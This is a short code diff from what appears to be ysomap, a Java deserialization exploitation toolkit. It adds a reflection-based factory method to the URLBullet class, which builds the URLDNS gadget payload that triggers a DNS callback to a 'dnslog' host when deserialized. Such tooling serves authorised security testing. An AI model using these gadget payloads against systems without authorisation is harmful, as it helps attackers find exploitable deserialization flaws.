@@ -2,6 +2,7 @@ package ysomap.bullets.jdk;
 
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
+import ysomap.core.util.ReflectionHelper;
 
 import java.io.IOException;
 import java.net.InetAddress;
@@ -30,6 +31,12 @@ public class URLBullet implements Bullet<URL> {
         //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
         URLStreamHandler handler = new SilentURLStreamHandler();
         return new URL(null, dnslog, handler); // URL to use as the Key
+    }
+
+    public static URLBullet newInstance(Object... args) throws Exception {
+        URLBullet bullet = new URLBullet();
+        ReflectionHelper.set(bullet, "dnslog", args[0]);
+        return bullet;
     }
 
     static class SilentURLStreamHandler extends URLStreamHandler {
